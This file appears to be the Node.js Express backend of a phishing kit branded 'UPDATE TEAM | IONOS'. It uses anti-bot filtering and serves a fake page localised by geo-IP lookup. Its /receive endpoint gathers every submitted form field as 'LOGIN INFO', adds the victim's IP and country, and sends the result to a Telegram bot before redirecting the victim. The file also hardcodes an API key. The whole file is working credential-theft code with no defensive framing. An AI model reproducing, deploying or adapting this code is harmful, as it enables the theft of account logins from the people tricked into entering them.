const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const fs = require('fs').promises;
const { getClientIp } = require('request-ip');

const antiBotMiddleware = require('./middleware/antibot');

const app = express();
const PORT = process.env.PORT || 3000;

const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const { botToken, chatId, url } = require('./config/settings.js');
console.log(url);
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Apply Anti-Bot Middleware
app.use(antiBotMiddleware);

// Geo-IP Cache
const geoIpCache = new Map();

const fetchGeoIpData = async (ipAddress) => {
    if (geoIpCache.has(ipAddress)) {
        return geoIpCache.get(ipAddress);
    }
    try {
        const { data } = await axios.get(
            `https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&key=${API_KEY}`
        );
        geoIpCache.set(ipAddress, data);
        return data;
    } catch (error) {
        console.error('Geo-IP Lookup Error:', error.message);
        return null;
    }
};

app.get('/', async (req, res) => {
    const ipAddress = getClientIp(req) || '127.0.0.1';
    const geoData = await fetchGeoIpData(ipAddress);

    const lang = geoData?.country?.isoAdminLanguages[0]?.isoAlpha2 || 'en';

    try {
        const htmlContent = await fs.readFile('./views/index.html', 'utf-8');
        const localizedContent = htmlContent.replace(
            '<head>',
            `<head><meta http-equiv="Content-Language" name="${lang}">`
        );
        res.send(localizedContent);
    } catch (error) {
        console.error('Error Reading HTML File:', error.message);
        res.status(500).send(`Error Reading HTML File: ${error.message}`);
    }
});

app.post('/receive', async (req, res) => {
    const ipAddress = getClientIp(req) || '127.0.0.1';
    const geoData = await fetchGeoIpData(ipAddress);
    const userAgent = req.headers['user-agent'];
    const systemLang = req.headers['accept-language'];

    
    let message = `👤 LOGIN INFO\n\n`;
		message += `========================\n\n`;
		message += `IP Address: ${geoData?.ip || 'Unknown'}\n`;
		message += `Country: ${geoData?.country?.name || 'Unknown'}\n`;
		
		Object.keys(req.body).forEach((key) => {
		    message += `${key}: ${req.body[key]}\n`;
		});
		
		message += `========================\n\n`;
		message += `✅ UPDATE TEAM | IONOS \n`;
		message += `💬 Telegram: https://t.me/UpdateTeams\n`;
		
		console.log(message);

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
        });
        console.log('URL:', url);
		res.status(200).send({url});
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).send('Error sending message');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));